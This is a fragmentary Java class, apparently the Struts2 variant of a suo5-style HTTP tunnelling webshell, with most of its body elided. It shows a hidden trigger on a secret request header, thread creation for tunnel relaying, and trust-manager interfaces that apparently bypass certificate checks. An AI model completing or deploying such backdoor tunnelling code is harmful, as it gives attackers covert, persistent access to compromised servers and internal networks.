 ...
 * @since 2025/12/9
 */
public class Suo5v2Struct2Action implements Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Struct2Action(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2Struct2Action(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
    ...
    public void execute() throws Exception {
        try {
            ...
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                new Suo5v2Struct2Action().process(request, response);
            }
...
//
    ...
    private byte[] performCreate(HttpServletRequest request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2Struct2Action(tunId, 1)).start();
                new Thread(new Suo5v2Struct2Action(tunId, 2)).start();
            }
        } catch (Exception e) {
